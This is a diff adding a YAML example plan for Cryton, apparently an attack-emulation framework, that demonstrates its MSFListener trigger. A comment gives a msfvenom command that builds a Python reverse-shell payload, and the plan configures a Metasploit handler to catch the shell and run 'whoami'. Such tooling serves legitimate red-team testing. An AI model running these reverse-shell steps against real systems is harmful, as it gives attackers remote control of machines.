@@ -1,0 +1,30 @@
+---
+# This example shows the usage of the MSFListener trigger type.
+# Required modules: mod_cmd.
+# To trigger the MSFListener, generate the script using `msfvenom` tool
+# (msfvenom -p python/shell_reverse_tcp lhost=<Metasploit host's IP address> lport=4444 > r_shell.py) and execute the script.
+
+plan:
+  name: MSFListener trigger example
+  owner: Cryton
+  stages:
+    - name: stage-msf # creates `stage-msf_session`
+      trigger_type: MSFListener
+      trigger_args:
+        identifiers:
+          via_exploit: exploit/multi/handler
+          via_payload: python/shell_reverse_tcp
+        exploit: multi/handler
+        payload: python/shell_reverse_tcp
+        payload_arguments:
+          LHOST: {{ metasploit_host_address }}
+          LPORT: 4444
+      steps:
+        - name: execute-in-session
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            use_named_session: stage-msf_session
+            module: mod_cmd
+            module_arguments:
+              cmd: whoami
